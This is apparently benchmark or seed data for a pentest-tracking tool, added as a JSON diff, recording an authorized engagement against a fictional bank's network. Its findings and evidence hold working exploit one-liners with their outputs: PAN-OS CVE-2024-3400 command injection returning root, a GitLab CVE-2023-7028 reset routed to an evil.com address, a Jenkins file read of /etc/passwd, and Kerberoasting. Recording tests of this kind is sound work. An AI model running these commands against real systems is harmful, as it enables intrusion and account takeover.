@@ -1,0 +1,339 @@
+{
+  "project": {
+    "id": "proj_bench_enterprise",
+    "name": "Global Financial Enterprise Perimeter & Internal Pentest",
+    "target": "perimeter.globalbank.internal",
+    "scope": "10.200.0.0/16, *.globalbank.internal, 198.51.100.0/24",
+    "objectives": "Assess perimeter gateways, pivot to Swift core banking enclave, audit domain admin escalation paths.",
+    "constraints": "No DoS on production core banking transactions; testing window 22:00-06:00 UTC."
+  },
+  "targets": [
+    "vpn.globalbank.internal",
+    "api.globalbank.internal",
+    "auth.globalbank.internal",
+    "mail.globalbank.internal",
+    "portal.globalbank.internal",
+    "swift-gw.globalbank.internal",
+    "core-db01.globalbank.internal",
+    "core-db02.globalbank.internal",
+    "dc01.globalbank.internal",
+    "dc02.globalbank.internal",
+    "jumpbox-linux.globalbank.internal",
+    "jumpbox-win.globalbank.internal",
+    "k8s-master.globalbank.internal",
+    "k8s-node01.globalbank.internal",
+    "k8s-node02.globalbank.internal",
+    "gitlab.globalbank.internal",
+    "jenkins.globalbank.internal",
+    "vault.globalbank.internal",
+    "siem.globalbank.internal",
+    "backup.globalbank.internal"
+  ],
+  "assets": [
+    {
+      "id": "a_1",
+      "ip": "198.51.100.10",
+      "host": "vpn.globalbank.internal",
+      "os": "Palo Alto PAN-OS 10.2.7",
+      "services": [
+        { "port": 443, "protocol": "tcp", "service": "https", "version": "GlobalProtect 10.2.7", "banner": "Server: PanWeb Server/ - ssl-vpn" }
+      ]
+    },
+    {
+      "id": "a_2",
+      "ip": "198.51.100.15",
+      "host": "api.globalbank.internal",
+      "os": "Linux 5.15",
+      "services": [
+        { "port": 80, "protocol": "tcp", "service": "http", "version": "Kong Gateway 3.4.0", "banner": "Server: kong/3.4.0" },
+        { "port": 443, "protocol": "tcp", "service": "https", "version": "Kong Gateway 3.4.0", "banner": "Server: kong/3.4.0" },
+        { "port": 8001, "protocol": "tcp", "service": "http-admin", "version": "Kong Admin API", "banner": "Kong Admin API unauthenticated" }
+      ]
+    },
+    {
+      "id": "a_3",
+      "ip": "198.51.100.20",
+      "host": "auth.globalbank.internal",
+      "os": "Red Hat Enterprise Linux 9",
+      "services": [
+        { "port": 443, "protocol": "tcp", "service": "https", "version": "Keycloak 22.0.1", "banner": "Keycloak Auth Service" }
+      ]
+    },
+    {
+      "id": "a_4",
+      "ip": "198.51.100.25",
+      "host": "mail.globalbank.internal",
+      "os": "Windows Server 2019",
+      "services": [
+        { "port": 25, "protocol": "tcp", "service": "smtp", "version": "Microsoft Exchange 2019", "banner": "220 mail.globalbank.internal ESMTP" },
+        { "port": 443, "protocol": "tcp", "service": "https", "version": "Microsoft Exchange OWA", "banner": "Outlook Web App" }
+      ]
+    },
+    {
+      "id": "a_5",
+      "ip": "198.51.100.30",
+      "host": "portal.globalbank.internal",
+      "os": "Ubuntu 22.04",
+      "services": [
+        { "port": 80, "protocol": "tcp", "service": "http", "version": "Apache 2.4.52", "banner": "Server: Apache/2.4.52 (Ubuntu)" },
+        { "port": 443, "protocol": "tcp", "service": "https", "version": "Apache 2.4.52", "banner": "OpenSSL/3.0.2" }
+      ]
+    },
+    {
+      "id": "a_6",
+      "ip": "10.200.1.10",
+      "host": "jumpbox-linux.globalbank.internal",
+      "os": "Debian 12",
+      "services": [
+        { "port": 22, "protocol": "tcp", "service": "ssh", "version": "OpenSSH 9.2p1", "banner": "SSH-2.0-OpenSSH_9.2p1 Debian" }
+      ]
+    },
+    {
+      "id": "a_7",
+      "ip": "10.200.1.11",
+      "host": "jumpbox-win.globalbank.internal",
+      "os": "Windows Server 2022",
+      "services": [
+        { "port": 3389, "protocol": "tcp", "service": "ms-wbt-server", "version": "RDP 10.0", "banner": "Remote Desktop Protocol" },
+        { "port": 5985, "protocol": "tcp", "service": "wsman", "version": "WinRM 3.0", "banner": "Microsoft HTTPAPI/2.0" }
+      ]
+    },
+    {
+      "id": "a_8",
+      "ip": "10.200.2.1",
+      "host": "dc01.globalbank.internal",
+      "os": "Windows Server 2022 Datacenter",
+      "services": [
+        { "port": 53, "protocol": "tcp", "service": "domain", "version": "Microsoft DNS", "banner": "DNS Server" },
+        { "port": 88, "protocol": "tcp", "service": "kerberos-sec", "version": "Microsoft Kerberos", "banner": "Kerberos v5" },
+        { "port": 135, "protocol": "tcp", "service": "msrpc", "version": "Microsoft Windows RPC", "banner": "MSRPC" },
+        { "port": 389, "protocol": "tcp", "service": "ldap", "version": "Active Directory LDAP", "banner": "AD LDAP" },
+        { "port": 445, "protocol": "tcp", "service": "microsoft-ds", "version": "SMB 3.1.1", "banner": "SMBv3" }
+      ]
+    },
+    {
+      "id": "a_9",
+      "ip": "10.200.2.2",
+      "host": "dc02.globalbank.internal",
+      "os": "Windows Server 2022 Datacenter",
+      "services": [
+        { "port": 88, "protocol": "tcp", "service": "kerberos-sec", "version": "Microsoft Kerberos", "banner": "Kerberos v5" },
+        { "port": 389, "protocol": "tcp", "service": "ldap", "version": "Active Directory LDAP", "banner": "AD LDAP" },
+        { "port": 445, "protocol": "tcp", "service": "microsoft-ds", "version": "SMB 3.1.1", "banner": "SMBv3" }
+      ]
+    },
+    {
+      "id": "a_10",
+      "ip": "10.200.3.50",
+      "host": "core-db01.globalbank.internal",
+      "os": "Oracle Linux 8",
+      "services": [
+        { "port": 1521, "protocol": "tcp", "service": "oracle-tns", "version": "Oracle Database 19c Enterprise", "banner": "TNS Listener 19.0.0.0" }
+      ]
+    },
+    {
+      "id": "a_11",
+      "ip": "10.200.3.51",
+      "host": "core-db02.globalbank.internal",
+      "os": "Ubuntu 22.04",
+      "services": [
+        { "port": 5432, "protocol": "tcp", "service": "postgresql", "version": "PostgreSQL 15.4", "banner": "PostgreSQL Database" }
+      ]
+    },
+    {
+      "id": "a_12",
+      "ip": "10.200.4.10",
+      "host": "swift-gw.globalbank.internal",
+      "os": "AIX 7.3",
+      "services": [
+        { "port": 4000, "protocol": "tcp", "service": "swift-alliance", "version": "SWIFT Alliance Gateway 7.6", "banner": "SWIFT Enclave Service" }
+      ]
+    },
+    {
+      "id": "a_13",
+      "ip": "10.200.5.10",
+      "host": "k8s-master.globalbank.internal",
+      "os": "Ubuntu 22.04",
+      "services": [
+        { "port": 6443, "protocol": "tcp", "service": "k8s-api", "version": "Kubernetes 1.28.2", "banner": "Kubernetes API Server" }
+      ]
+    },
+    {
+      "id": "a_14",
+      "ip": "10.200.5.11",
+      "host": "k8s-node01.globalbank.internal",
+      "os": "Ubuntu 22.04",
+      "services": [
+        { "port": 10250, "protocol": "tcp", "service": "kubelet", "version": "Kubernetes Kubelet", "banner": "Kubelet API" }
+      ]
+    },
+    {
+      "id": "a_15",
+      "ip": "10.200.5.12",
+      "host": "k8s-node02.globalbank.internal",
+      "os": "Ubuntu 22.04",
+      "services": [
+        { "port": 10250, "protocol": "tcp", "service": "kubelet", "version": "Kubernetes Kubelet", "banner": "Kubelet API" }
+      ]
+    },
+    {
+      "id": "a_16",
+      "ip": "10.200.6.100",
+      "host": "gitlab.globalbank.internal",
+      "os": "Ubuntu 20.04",
+      "services": [
+        { "port": 80, "protocol": "tcp", "service": "http", "version": "GitLab CE 16.0.1", "banner": "GitLab Community Edition" },
+        { "port": 443, "protocol": "tcp", "service": "https", "version": "GitLab CE 16.0.1", "banner": "GitLab CE" }
+      ]
+    },
+    {
+      "id": "a_17",
+      "ip": "10.200.6.105",
+      "host": "jenkins.globalbank.internal",
+      "os": "Debian 11",
+      "services": [
+        { "port": 8080, "protocol": "tcp", "service": "http", "version": "Jenkins 2.441", "banner": "Jenkins CI Server" }
+      ]
+    },
+    {
+      "id": "a_18",
+      "ip": "10.200.6.200",
+      "host": "vault.globalbank.internal",
+      "os": "Alpine Linux",
+      "services": [
+        { "port": 8200, "protocol": "tcp", "service": "http", "version": "HashiCorp Vault 1.15", "banner": "Vault Server" }
+      ]
+    },
+    {
+      "id": "a_19",
+      "ip": "10.200.7.10",
+      "host": "siem.globalbank.internal",
+      "os": "RHEL 8",
+      "services": [
+        { "port": 8000, "protocol": "tcp", "service": "http", "version": "Splunk Enterprise 9.1", "banner": "Splunkd HTTP Server" },
+        { "port": 8089, "protocol": "tcp", "service": "splunkd", "version": "Splunkd REST API", "banner": "Splunk Management" }
+      ]
+    },
+    {
+      "id": "a_20",
+      "ip": "10.200.7.50",
+      "host": "backup.globalbank.internal",
+      "os": "Windows Server 2019",
+      "services": [
+        { "port": 10000, "protocol": "tcp", "service": "ndmp", "version": "Veeam Backup 12.0", "banner": "Veeam Backup & Replication" }
+      ]
+    }
+  ],
+  "findings": [
+    {
+      "id": "f_1",
+      "title": "CVE-2024-3400 PAN-OS GlobalProtect Pre-Auth Command Injection",
+      "cve": "CVE-2024-3400",
+      "target": "vpn.globalbank.internal:443",
+      "severity": "Critical",
+      "cvss": 10.0,
+      "eps": 99,
+      "status": "CONFIRMED",
+      "poc": "curl -k -H 'Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/`id`' https://vpn.globalbank.internal/ssl-vpn/hipreport.esp",
+      "impact": "Root-level command execution on edge firewall appliance."
+    },
+    {
+      "id": "f_2",
+      "title": "Unauthenticated Kong Gateway Admin API Exposure",
+      "cve": "N/A",
+      "target": "api.globalbank.internal:8001",
+      "severity": "High",
+      "cvss": 8.6,
+      "eps": 88,
+      "status": "CONFIRMED",
+      "poc": "curl http://api.globalbank.internal:8001/routes",
+      "impact": "Operator can inject malicious reverse proxy routes and rewrite authentication headers."
+    },
+    {
+      "id": "f_3",
+      "title": "Active Directory Kerberoasting Service Principal Accounts",
+      "cve": "N/A",
+      "target": "dc01.globalbank.internal:88",
+      "severity": "High",
+      "cvss": 7.8,
+      "eps": 82,
+      "status": "CONFIRMED",
+      "poc": "GetUserSPNs.py -request -dc-ip 10.200.2.1 globalbank.internal/svc_backup",
+      "impact": "Offline TGS ticket cracking yields plaintext credentials for service accounts."
+    },
+    {
+      "id": "f_4",
+      "title": "GitLab CVE-2023-7028 Arbitrary User Password Reset without Interaction",
+      "cve": "CVE-2023-7028",
+      "target": "gitlab.globalbank.internal:443",
+      "severity": "Critical",
+      "cvss": 10.0,
+      "eps": 95,
+      "status": "CONFIRMED",
+      "poc": "curl -X POST https://gitlab.globalbank.internal/users/password -d 'user[email][]=victim@globalbank.com&user[email][]=attacker@evil.com'",
+      "impact": "Takeover of corporate developer and administrator repositories."
+    },
+    {
+      "id": "f_5",
+      "title": "Jenkins CVE-2024-23897 Arbitrary File Read CLI Vulnerability",
+      "cve": "CVE-2024-23897",
+      "target": "jenkins.globalbank.internal:8080",
+      "severity": "High",
+      "cvss": 8.8,
+      "eps": 90,
+      "status": "CONFIRMED",
+      "poc": "java -jar jenkins-cli.jar -s http://jenkins.globalbank.internal:8080/ help '@/etc/passwd'",
+      "impact": "Exfiltration of credentials, SSH keys, and system files."
+    }
+  ],
+  "evidence": [
+    {
+      "id": "evi_1",
+      "sourceTool": "nmap",
+      "target": "198.51.100.10",
+      "command": "nmap -sV -p 443 198.51.100.10",
+      "stdout": "443/tcp open ssl/http Palo Alto GlobalProtect portal 10.2.7",
+      "timestamp": "2026-09-08T10:00:00Z"
+    },
+    {
+      "id": "evi_2",
+      "sourceTool": "curl",
+      "target": "https://vpn.globalbank.internal/ssl-vpn/hipreport.esp",
+      "command": "curl -k -H 'Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/`id`' https://vpn.globalbank.internal/ssl-vpn/hipreport.esp",
+      "stdout": "uid=0(root) gid=0(root) groups=0(root)",
+      "timestamp": "2026-09-08T10:30:00Z"
+    },
+    {
+      "id": "evi_3",
+      "sourceTool": "curl",
+      "target": "http://api.globalbank.internal:8001/routes",
+      "command": "curl -s http://api.globalbank.internal:8001/routes | jq .data[0]",
+      "stdout": "{\n  \"name\": \"core-banking-route\",\n  \"paths\": [\"/api/v1/transfer\"],\n  \"service\": {\"id\": \"core-svc-uuid\"}\n}",
+      "timestamp": "2026-09-08T11:15:00Z"
+    },
+    {
+      "id": "evi_4",
+      "sourceTool": "impacket",
+      "target": "dc01.globalbank.internal",
+      "command": "GetUserSPNs.py -request -dc-ip 10.200.2.1 globalbank.internal/svc_backup",
+      "stdout": "$krb5tgs$23$*svc_backup$GLOBALBANK.INTERNAL*$globalbank.internal/svc_backup*$c7b39a4... (TGS hash)",
+      "timestamp": "2026-09-08T14:45:00Z"
+    },
+    {
+      "id": "evi_5",
+      "sourceTool": "curl",
+      "target": "https://gitlab.globalbank.internal/users/password",
+      "command": "curl -i -X POST https://gitlab.globalbank.internal/users/password -d 'user[email][]=admin@globalbank.internal&user[email][]=pwn@evil.com'",
+      "stdout": "HTTP/2 302 Found\nLocation: https://gitlab.globalbank.internal/users/sign_in",
+      "timestamp": "2026-09-08T16:00:00Z"
+    }
+  ],
+  "tasks": [
+    { "id": "t_1", "title": "Perimeter Discovery and Firewall Audit", "phase": "RECON", "status": "DONE" },
+    { "id": "t_2", "title": "Validate CVE-2024-3400 Remote Command Execution", "phase": "VALIDATION", "status": "DONE" },
+    { "id": "t_3", "title": "Pivot to Internal Jumpbox via Extracted Session Token", "phase": "EXPLOITATION", "status": "IN_PROGRESS" },
+    { "id": "t_4", "title": "Active Directory Kerberoasting against Domain Controllers", "phase": "POST_EXPLOITATION", "status": "TODO" },
+    { "id": "t_5", "title": "Enclave Lateral Movement into SWIFT Core Network", "phase": "POST_EXPLOITATION", "status": "TODO" }
+  ],
+  "notes": "2026-09-08 09:00 - Authorized testing started against perimeter scope.\n2026-09-08 10:35 - CVE-2024-3400 validated on edge gateway. Root telemetry callback received.\n2026-09-08 11:20 - Discovered unauthenticated Kong Admin API on port 8001.\n2026-09-08 15:00 - TGS ticket extracted for svc_backup account; hash sent to hashcat queue."
+}
